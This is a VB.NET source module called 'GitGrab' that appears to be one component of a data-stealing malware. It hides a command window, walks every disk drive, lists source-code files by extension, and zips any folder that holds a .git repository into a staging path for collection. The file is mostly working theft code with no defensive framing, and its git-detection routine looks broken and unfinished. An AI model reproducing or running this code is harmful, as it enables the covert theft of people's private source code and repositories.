Imports System.IO
Imports System.Text

Module GitGrab
    Public Sub Handler()
        Dim Process As New Process()
        Process.StartInfo.FileName = "cmd.exe"
        Process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        Process.StartInfo.CreateNoWindow = True
        Process.StartInfo.UseShellExecute = False
        Process.StartInfo.Arguments = "git -version"
        Process.Start()
        If Process.StandardOutput.ReadToEnd() <> "'git' is not recognized as an internal or external command, operable program or batch file." Then

        End If
    End Sub
    Public Sub GitGraber()
        Try
            If Config.Variables.Debug Then
                Console.WriteLine("GitGraber working...")
            End If
            Dim disc As ArrayList = GetDiscName()
            For i = 0 To disc.Count - 1
                SourceSearcher(GetConfigJson().MainPath, disc(i))
            Next
        Catch ex As Exception
            If Config.Variables.Debug Then
                Console.WriteLine("GitGraber disc error:" & ex.ToString)
            End If
        End Try
    End Sub
    Public Sub SourceSearcher(ByVal path As String, ByVal disc As String)
        Try
            Dim extensions As New ArrayList From {
                        ".py",
                        ".c",
                        ".vb",
                        ".php",
                        ".js",
                        ".cpp",
                        ".css",
                        ".java",
                        ".rlib",
                        ".go"
                    }
            Using sw As New IO.StreamWriter(path & "\SourceCodes.txt")
                For Each dir As String In GetDirectories(disc)
                    If Directory.Exists(dir) Then
                        'Get Files
                        For Each files As String In GetFiles(dir)
                            If extensions.ToArray().Any(Function(x) x.ToString().Contains(IO.Path.GetExtension(files).ToLower)) Then
                                If File.Exists(files) Then
                                    sw.WriteLine(files)
                                End If
                            End If
                        Next
                        'Git
                        Dim di As New IO.DirectoryInfo(dir)
                        If di.GetDirectories()(0).Name = ".git" Then
                            Dim parentdirectoryPath As New StringBuilder
                            For i = 0 To dir.LastIndexOf("\")
                                parentdirectoryPath.Append(dir.Chars(i))
                            Next
                            InZip(path, parentdirectoryPath.ToString)
                            Dim parentdirectory As New IO.DirectoryInfo(parentdirectoryPath.ToString)
                            sw.WriteLine(path & "\" & parentdirectory.GetDirectories()(0).Name)
                        End If
                    End If
                Next
            End Using
        Catch ex As Exception
            If Config.Variables.Debug Then
                Console.WriteLine("GitGraber file search error:" & ex.ToString)
            End If
        End Try
    End Sub
End Module
